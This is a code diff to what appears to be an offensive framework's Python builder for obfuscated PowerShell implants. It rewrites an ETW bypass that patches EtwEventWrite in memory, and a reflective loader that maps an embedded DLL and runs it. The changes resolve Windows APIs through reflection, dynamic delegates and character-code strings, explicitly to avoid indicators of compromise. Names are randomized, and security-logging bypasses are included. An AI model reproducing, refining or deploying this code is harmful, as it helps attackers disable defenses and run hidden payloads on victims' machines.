@@ -90,25 +90,37 @@ ${v['a8']}.SetValue($null,$true)
 
 
 def _etw_bypass(v: dict) -> str:
-    """ETW bypass — patches EtwEventWrite to ret."""
+    """ETW bypass -- patches EtwEventWrite to ret via reflection. No Add-Type, no static IoCs."""
+    def _c(s):
+        return '+'.join(f'[char]{ord(c)}' for c in s)
+
     return f"""\
-# ── ETW ──
+# -- ETW --
 try{{
-${v['e1']}=@"
-[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
-[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
-[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
-"@
-${v['e2']}=Add-Type -MemberDefinition ${v['e1']} -Name ([char]75+[char]51+[char]50) -Namespace '' -PassThru
-${v['e3']}=[char]110+[char]116+[char]100+[char]108+[char]108
-${v['e4']}=[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101
-${v['e5']}=${v['e2']}::GetProcAddress(${v['e2']}::LoadLibrary(${v['e3']}),${v['e4']})
-${v['e6']}=0
-${v['e2']}::VirtualProtect(${v['e5']},[UIntPtr]1,0x40,[ref]${v['e6']})|Out-Null
-[Runtime.InteropServices.Marshal]::WriteByte(${v['e5']},0xC3)
-${v['e2']}::VirtualProtect(${v['e5']},[UIntPtr]1,${v['e6']},[ref]${v['e6']})|Out-Null
+${v['e1']}=$null;foreach(${v['e2']} in [AppDomain]::CurrentDomain.GetAssemblies()){{try{{${v['e1']}=${v['e2']}.GetType(({_c('Microsoft.Win32.UnsafeNativeMethods')}))}}catch{{}};if(${v['e1']}){{break}}}}
+if(${v['e1']}){{
+${v['e3']}=${v['e1']}.GetMethod(({_c('GetProcAddress')}),[type[]]@([Runtime.InteropServices.HandleRef],[string]))
+${v['e4']}=${v['e1']}.GetMethod(({_c('GetModuleHandle')}))
+${v['e5']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['e4']}.Invoke($null,@(({_c('ntdll')}))))
+${v['e6']}=${v['e3']}.Invoke($null,@(${v['e5']},({_c('EtwEventWrite')})))
+${v['e7']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['e4']}.Invoke($null,@(({_c('kernel32')}))))
+${v['e8']}=${v['e3']}.Invoke($null,@(${v['e7']},({_c('VirtualProtect')})))
+${v['e9']}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('E')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false)
+${v['e10']}=${v['e9']}.DefineType('D'+[guid]::NewGuid().ToString('N'),'Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate])
+${v['e10']}.DefineConstructor('RTSpecialName,HideBySig,Public','Standard',@([IntPtr],[IntPtr])).SetImplementationFlags('Runtime,Managed')
+${v['e10']}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',[bool],@([IntPtr],[UIntPtr],[uint32],[uint32].MakeByRefType())).SetImplementationFlags('Runtime,Managed')
+${v['e11']}=${v['e10']}.CreateType()
+${v['e12']}=[type](({_c('System.Runtime.InteropServices.Marshal')}))
+${v['e13']}=${v['e12']}.GetMethod(({_c('GetDelegateForFunctionPointer')}),[type[]]@([IntPtr],[type]))
+${v['e14']}=${v['e13']}.Invoke($null,@(${v['e8']},${v['e11']}))
+[uint32]${v['e15']}=0
+${v['e14']}.Invoke(${v['e6']},[UIntPtr]1,64,[ref]${v['e15']})|Out-Null
+${v['e12']}::WriteByte(${v['e6']},195)
+${v['e14']}.Invoke(${v['e6']},[UIntPtr]1,${v['e15']},[ref]${v['e15']})|Out-Null
+}}
 }}catch{{}}
 """
+
 
 
 def _sbl_bypass(v: dict) -> str:
@@ -349,26 +361,55 @@ try{{${v['pipe']}.Close()}}catch{{}}
 # ─── Reflective PE loader ───
 
 def _pe_loader(v: dict, dll_b64_gz: str, debug: bool = False) -> str:
-    """Generate PowerShell reflective PE loader — embeds and runs a DLL in-memory."""
-    # Debug helper — Write-Host always prints regardless of ErrorActionPreference
+    """Generate PowerShell reflective PE loader -- IoC-free via reflection + dynamic delegates."""
     _d = 'Write-Host' if debug else '#'
 
+    def _c(s):
+        return '+'.join(f'[char]{ord(c)}' for c in s)
+
     return f"""\
-# ── Reflective Loader ──
-${v['lcs']}=@'
-using System;using System.Runtime.InteropServices;
-public class {v['lt']}{{
-[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
-[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
-[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string n);
-[DllImport("kernel32",EntryPoint="GetProcAddress")]public static extern IntPtr GetProcAddressOrd(IntPtr h,IntPtr n);
+# -- Reflective Loader --
+
+# Bootstrap: resolve native APIs via reflection
+${v['lun']}=$null
+foreach(${v['las']} in [AppDomain]::CurrentDomain.GetAssemblies()){{
+try{{${v['lun']}=${v['las']}.GetType(({_c('Microsoft.Win32.UnsafeNativeMethods')}))}}catch{{}}
+if(${v['lun']}){{break}}
 }}
-public delegate bool {v['ld']}(IntPtr h,uint r,IntPtr p);
-'@
-try{{${v['ltp']}=Add-Type -TypeDefinition ${v['lcs']} -PassThru -ErrorAction Stop}}catch{{Write-Host "FATAL: Add-Type failed: $_";return}}
-if(-not ${v['ltp']}){{Write-Host "FATAL: Add-Type returned null";return}}
-{_d} "[DBG] Add-Type OK"
-${v['lm']}=[Runtime.InteropServices.Marshal]
+if(-not ${v['lun']}){{Write-Host "FATAL: init failed";return}}
+{_d} "[DBG] Bootstrap OK"
+${v['lgp']}=${v['lun']}.GetMethod(({_c('GetProcAddress')}),[type[]]@([Runtime.InteropServices.HandleRef],[string]))
+${v['lgm']}=${v['lun']}.GetMethod(({_c('GetModuleHandle')}))
+if(-not ${v['lgp']} -or -not ${v['lgm']}){{Write-Host "FATAL: method resolve failed";return}}
+${v['lkh']}=${v['lgm']}.Invoke($null,@(({_c('kernel32')})))
+${v['lkr']}=New-Object Runtime.InteropServices.HandleRef((New-Object IntPtr),${v['lkh']})
+
+# Marshal type (obfuscated)
+${v['lm']}=[type](({_c('System.Runtime.InteropServices.Marshal')}))
+${v['lgd']}=${v['lm']}.GetMethod(({_c('GetDelegateForFunctionPointer')}),[type[]]@([IntPtr],[type]))
+
+# Dynamic delegate factory via Reflection.Emit
+${v['lmb']}=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('R')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false)
+${v['lfd']}={{param(${{rt}},${{pa}})
+${{dt}}=${v['lmb']}.DefineType('T'+[guid]::NewGuid().ToString('N'),'Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate])
+${{dt}}.DefineConstructor('RTSpecialName,HideBySig,Public','Standard',@([IntPtr],[IntPtr])).SetImplementationFlags('Runtime,Managed')
+${{dt}}.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',${{rt}},${{pa}}).SetImplementationFlags('Runtime,Managed')
+${{dt}}.CreateType()}}
+
+# Create delegate types
+${v['ltv']}=&${v['lfd']} ([IntPtr]) @([IntPtr],[UIntPtr],[uint32],[uint32])
+${v['ltl']}=&${v['lfd']} ([IntPtr]) @([IntPtr])
+${v['ltg']}=&${v['lfd']} ([IntPtr]) @([IntPtr],[IntPtr])
+${v['ltm']}=&${v['lfd']} ([bool]) @([IntPtr],[uint32],[IntPtr])
+
+# Resolve Win32 functions
+${v['lfv']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('VirtualAlloc')}))),${v['ltv']}))
+${v['lfl']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('LoadLibraryA')}))),${v['ltl']}))
+${v['lfg']}=${v['lgd']}.Invoke($null,@(${v['lgp']}.Invoke($null,@(${v['lkr']},({_c('GetProcAddress')}))),${v['ltg']}))
+if(-not ${v['lfv']} -or -not ${v['lfl']} -or -not ${v['lfg']}){{Write-Host "FATAL: API resolve failed";return}}
+{_d} "[DBG] APIs resolved"
+
+# Decompress embedded DLL
 ${v['lb6']}=@'
 {dll_b64_gz}
 '@
@@ -382,7 +423,7 @@ ${v['ldl']}=${v['los']}.ToArray()
 ${v['lgs']}.Close();${v['lms']}.Close();${v['los']}.Close()
 }}catch{{Write-Host "FATAL: Decompress failed: $_";return}}
 {_d} "[DBG] DLL bytes: $(${v['ldl']}.Length)"
-# Arch check — x64 DLL needs x64 PowerShell
+# Arch check
 if([IntPtr]::Size -eq 4){{
 ${v['lmg']}=[BitConverter]::ToUInt16(${v['ldl']},([BitConverter]::ToInt32(${v['ldl']},0x3C))+24)
 if(${v['lmg']}-eq 0x20b){{Write-Host "FATAL: x64 DLL loaded in 32-bit PowerShell";return}}
@@ -416,13 +457,13 @@ ${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+140)
 }}
 {_d} "[DBG] PE: magic=0x$(${v['lmg']}.ToString('X4')) entry=0x$(${v['ler']}.ToString('X')) imgBase=0x$(${v['lib']}.ToString('X')) size=0x$(${v['lsi']}.ToString('X'))"
 
-# Allocate — try preferred base, fall back to any
-${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]${v['lib']},[UIntPtr][uint64]${v['lsi']},0x3000,0x40)
+# Allocate -- try preferred base, fall back to any
+${v['lnb']}=${v['lfv']}.Invoke([IntPtr]${v['lib']},[UIntPtr][uint64]${v['lsi']},12288,64)
 if(${v['lnb']}-eq [IntPtr]::Zero){{
 {_d} "[DBG] Preferred base failed, trying any"
-${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]::Zero,[UIntPtr][uint64]${v['lsi']},0x3000,0x40)
+${v['lnb']}=${v['lfv']}.Invoke([IntPtr]::Zero,[UIntPtr][uint64]${v['lsi']},12288,64)
 }}
-if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: VirtualAlloc failed - size=$(${v['lsi']})";return}}
+if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: alloc failed - size=$(${v['lsi']})";return}}
 {_d} "[DBG] Allocated at 0x$(${v['lnb']}.ToString('X'))"
 
 # Copy headers
@@ -481,8 +522,10 @@ ${v['lin']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},12))
 ${v['lia']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},16))
 if(${v['lin']}-eq 0){{break}}
 if(${v['lit']}-eq 0){{${v['lit']}=${v['lia']}}}
-${v['lmh']}=${v['ltp']}[0]::LoadLibrary(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))
-if(${v['lmh']}-eq [IntPtr]::Zero){{Write-Host "FATAL: LoadLibrary failed for $(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))";return}}
+${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))
+${v['lmh']}=${v['lfl']}.Invoke(${v['lsp']})
+${v['lm']}::FreeHGlobal(${v['lsp']})
+if(${v['lmh']}-eq [IntPtr]::Zero){{Write-Host "FATAL: module load failed for $(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))";return}}
 ${v['lpt']}=[IntPtr]::Add(${v['lnb']},[int]${v['lit']})
 ${v['lad']}=[IntPtr]::Add(${v['lnb']},[int]${v['lia']})
 while($true){{
@@ -490,10 +533,12 @@ if(${v['l64']}){{
 ${v['lie']}=${v['lm']}::ReadInt64(${v['lpt']})
 if(${v['lie']}-eq 0){{break}}
 if(${v['lie']}-lt 0){{
-${v['lfa']}=${v['ltp']}[0]::GetProcAddressOrd(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
+${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
 }}else{{
 ${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
-${v['lfa']}=${v['ltp']}[0]::GetProcAddress(${v['lmh']},${v['lfn']})
+${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lfn']})
+${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},${v['lsp']})
+${v['lm']}::FreeHGlobal(${v['lsp']})
 }}
 ${v['lm']}::WriteInt64(${v['lad']},${v['lfa']}.ToInt64())
 ${v['lpt']}=[IntPtr]::Add(${v['lpt']},8)
@@ -502,10 +547,12 @@ ${v['lad']}=[IntPtr]::Add(${v['lad']},8)
 ${v['lie']}=${v['lm']}::ReadInt32(${v['lpt']})
 if(${v['lie']}-eq 0){{break}}
 if(${v['lie']}-lt 0){{
-${v['lfa']}=${v['ltp']}[0]::GetProcAddressOrd(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
+${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},[IntPtr](${v['lie']}-band 0xFFFF))
 }}else{{
 ${v['lfn']}=${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int](${v['lie']}-band 0x7FFFFFFF)+2))
-${v['lfa']}=${v['ltp']}[0]::GetProcAddress(${v['lmh']},${v['lfn']})
+${v['lsp']}=${v['lm']}::StringToHGlobalAnsi(${v['lfn']})
+${v['lfa']}=${v['lfg']}.Invoke(${v['lmh']},${v['lsp']})
+${v['lm']}::FreeHGlobal(${v['lsp']})
 }}
 ${v['lm']}::WriteInt32(${v['lad']},${v['lfa']}.ToInt32())
 ${v['lpt']}=[IntPtr]::Add(${v['lpt']},4)
@@ -521,12 +568,13 @@ ${v['lid']}=[IntPtr]::Add(${v['lid']},20)
 ${v['lep']}=[IntPtr]::Add(${v['lnb']},[int]${v['ler']})
 {_d} "[DBG] Calling entry at 0x$(${v['lep']}.ToString('X'))"
 try{{
-${v['ldm']}=${v['lm']}::GetDelegateForFunctionPointer(${v['lep']},${v['ltp']}[1])
+${v['ldm']}=${v['lgd']}.Invoke($null,@(${v['lep']},${v['ltm']}))
 ${v['ldm']}.Invoke(${v['lnb']},[uint32]1,[IntPtr]::Zero)
 }}catch{{Write-Host "FATAL: DllMain exception: $_";return}}
 {_d} "[DBG] DllMain returned OK, keeping process alive"
 while($true){{Start-Sleep 86400}}
 """
+
 
 
 # ─── Main build function ───
@@ -567,6 +615,7 @@ def build_powershell_agent(
         'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
         # ETW
         'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
+        'e7', 'e8', 'e9', 'e10', 'e11', 'e12', 'e13', 'e14', 'e15',
         # SBL
         's1', 's2', 's3', 's4', 's5',
         # Agent
@@ -661,15 +710,24 @@ def build_powershell_loader(
         'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8',
         # ETW bypass
         'e1', 'e2', 'e3', 'e4', 'e5', 'e6',
+        'e7', 'e8', 'e9', 'e10', 'e11', 'e12', 'e13', 'e14', 'e15',
         # SBL bypass
         's1', 's2', 's3', 's4', 's5',
-        # PE loader
-        'lcs', 'ltp', 'lm',
+        # PE loader - bootstrap
+        'lun', 'las', 'lgp', 'lgm', 'lkh', 'lkr',
+        # PE loader - delegate infrastructure
+        'lm', 'lgd', 'lmb', 'lfd',
+        # PE loader - delegate types & instances
+        'ltv', 'ltl', 'ltg', 'ltm',
+        'lfv', 'lfl', 'lfg',
+        # PE loader - decompress
         'lb6', 'lgz', 'lms', 'lgs', 'los', 'ldl',
+        # PE loader - PE parse
         'lef', 'lns', 'lso', 'lop', 'lmg', 'l64',
         'ler', 'lib', 'lsi', 'lsh',
         'lir', 'lis', 'lrr', 'lrs',
-        'lnb',
+        # PE loader - sections, relocs, imports, entry
+        'lnb', 'lsp',
         'lsc', 'li', 'lva', 'lrd', 'lrp', 'lds',
         'ldt', 'lpo', 'len', 'lbv', 'lbz', 'lne',
         'lj', 'lra', 'let', 'leo', 'lad', 'lv',
@@ -684,10 +742,6 @@ def build_powershell_loader(
             name = _rand_name(random.randint(6, 10))
         v[var] = name
         used.add(name)
-
-    # C# class and delegate type names (randomized)
-    v['lt'] = _rand_name(10)
-    v['ld'] = _rand_name(10)
 
     # Assemble script
     parts = []
